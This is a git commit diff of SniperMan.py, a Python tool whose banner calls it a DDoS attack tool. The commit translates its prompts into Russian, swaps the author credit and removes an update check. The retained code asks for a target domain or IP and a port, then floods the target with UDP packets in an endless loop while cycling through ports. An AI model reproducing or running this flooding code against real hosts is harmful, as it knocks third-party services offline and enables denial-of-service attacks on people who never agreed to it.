a2335c513db815455160b94f8ecfd793ef3815a4
ItsKek <75073133+ItsKek@users.noreply.github.com>
2021-05-09 13:47:27 +1000

    Update SniperMan.py

--- SniperMan.py
+++ SniperMan.py
@@ -1,6 +1,5 @@
-# Version 1.1
-# coded By botcoder
-# copyright(please dont use my code without lience)
+# Ru version
+# Original https://github.com/BOT-CODER/SniperMan
 from platform import system
 import os
 import time
@@ -18,19 +17,11 @@ de_version="1.1"
 colorama.init()
 ################################################################################
 banner=Fore.MAGENTA+'''
-   ▄████████ ███▄▄▄▄    ▄█     ▄███████▄    ▄████████    ▄████████   ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄   
-  ███    ███ ███▀▀▀██▄ ███    ███    ███   ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███▀▀▀██▄ 
-  ███    █▀  ███   ███ ███▌   ███    ███   ███    █▀    ███    ███ ███   ███   ███   ███    ███ ███   ███ 
-  ███        ███   ███ ███▌   ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███   ███   ███   ███    ███ ███   ███ 
-▀███████████ ███   ███ ███▌ ▀█████████▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███   ███   ███ ▀███████████ ███   ███ 
-         ███ ███   ███ ███    ███          ███    █▄  ▀███████████ ███   ███   ███   ███    ███ ███   ███ 
-   ▄█    ███ ███   ███ ███    ███          ███    ███   ███    ███ ███   ███   ███   ███    ███ ███   ███ 
- ▄████████▀   ▀█   █▀  █▀    ▄████▀        ██████████   ███    ███  ▀█   ███   █▀    ███    █▀   ▀█   █▀                                          
+Инструмент для ДДОС АТАКИ                                          
 '''+Fore.RESET
 credit=(Fore.CYAN+
-'''                                                                     Author : Bot-Codder
-	                                                             Github  : https://github.com/BOT-CODER
-	                                                             Please contact us in github page                                                           
+'''                                                                     Автор сея чуда : Itskekoff
+	                                                             Гитхаб автора : https://github.com/itskek                                                          
 '''+Fore.RESET)
 ################################################################################
 #platform info
@@ -48,81 +39,58 @@ def chech_con():
 	try:
 		request.urlopen('https://www.google.co.in/',timeout=3)
 	except KeyboardInterrupt:
-		print(Fore.RED + "Stopped by User" + Fore.RESET)
+		print(Fore.RED + "Остановка от пользователя" + Fore.RESET)
 		exit()
 	except:
-		print(Fore.RED+'Please Check your connection'+Fore.RESET)
+		print(Fore.RED+'Проверь свой интернет!'+Fore.RESET)
 		exit()
-def update():
-	import urllib.request as urequest
-	from bs4 import BeautifulSoup as soup
-	page=urequest.urlopen('https://pastebin.com/G7gFkwfb').read()
-	soup=soup(page,'html.parser')
-	version=soup.find('div',class_='de1').text
-	if version>de_version:
-		import webbrowser
-		print(Fore.CYAN + "Version " + Fore.MAGENTA + version + Fore.CYAN + " is Avaiable")
-		print(Fore.RED + "Please update the Program")
-		print("Redirecting...." + Fore.RESET)
-		time.sleep(3)
-		webbrowser.open('https://github.com/BOT-CODER/SniperMan/')
-		exit()
-	else:
-		pass
-try:
-	print(Fore.CYAN+" Checking For Internet "+Fore.RESET)
-	time.sleep(2)
-	chech_con()
-	update()
-	os.system(cmd)
-except KeyboardInterrupt:
-	print(Fore.RED + "Stopped by User" + Fore.RESET)
+	print(Fore.RED + "Остановил пользователем" + Fore.RESET)
 	exit()
 try:
 	while True:
 		print(banner)
 		print(credit)
-		print(Fore.RED+"1. Website Domain\n2. IP Addresse\n3. Exit"+Fore.RESET)
-		opt=str(input(Fore.GREEN+"\nEnter Your choice: "+Fore.RESET))
+		print(Fore.RED+"1. Домайн сайта\n2. Айпи адрес\n3. Выход"+Fore.RESET)
+		opt=str(input(Fore.GREEN+"\nВыбери цифру: "+Fore.RESET))
 		if opt=='1':
-			domain=str(input(Fore.CYAN+"Enter The Website (eg:google.com):"+Fore.RESET))
+			domain=str(input(Fore.CYAN+"Введи сайт (например: google.com):"+Fore.RESET))
 			ip=socket.gethostbyname(domain)
 			break
 		elif opt=='2':
-			ip = input(Fore.CYAN+"IP Addresse  : "+Fore.RESET)
+			ip = input(Fore.CYAN+"Айпи адрес  : "+Fore.RESET)
 			break
 		elif opt=='3':
 			time.sleep(1)
-			print(Fore.RED+"See you S00N"+Fore.RESET)
+			print(Fore.RED+"Прощай("+Fore.RESET)
 			exit()
 		else:
-			print(Fore.RED+'Invaild Choice!'+Fore.RESET)
+			print(Fore.RED+'Неверный выбор!'+Fore.RESET)
 			time.sleep(2)
 			os.system(cmd)
-	port =int(input(Fore.CYAN+"Port Number  : "+Fore.RESET))
+	port =int(input(Fore.CYAN+"Номер порта  : "+Fore.RESET))
 	os.system(cmd)
-	print(Fore.CYAN+"INITIALIZING....")
+	print(Fore.CYAN+"Инициализация....")
 	for i in tqdm(range(10000)):
 		print(end='\r')
 	time.sleep(4)
-	print('STARTING...')
+	print('Запуск...')
 	time.sleep(4)
 	sent = 0
 except Exception as e:
-	print(Fore.RED+"Something Went Wrong!")
-	print("Reason:",e,Fore.RESET)
+	print(Fore.RED+"Что-то пошло не так!")
+	print("Причина:",e,Fore.RESET)
 	exit()
 try:
 	while True:
 		sock.sendto(bytes, (ip,port))
 		sent=sent+1
 		port=port+1
-		print(Fore.CYAN+ "Sent %s packet to %s throught port:%s" % (sent, ip, port))
+		print(Fore.CYAN+ "Отправил %s пакетов на %s используя порт:%s" % (sent, ip, port))
 		if port==65534:
 			port=1
 		elif port==1900:
 			port=1901
 except Exception as e:
-	print(Fore.RED+"Exited\nReason: ",e,Fore.RESET)
+	print(Fore.RED+"Выход!\nПричина: ",e,Fore.RESET)
 except KeyboardInterrupt:
-	print(Fore.RED+"\nStopped by User"+Fore.RESET)
+	print(Fore.RED+"\nОстановка пользователем!"+Fore.RESET)
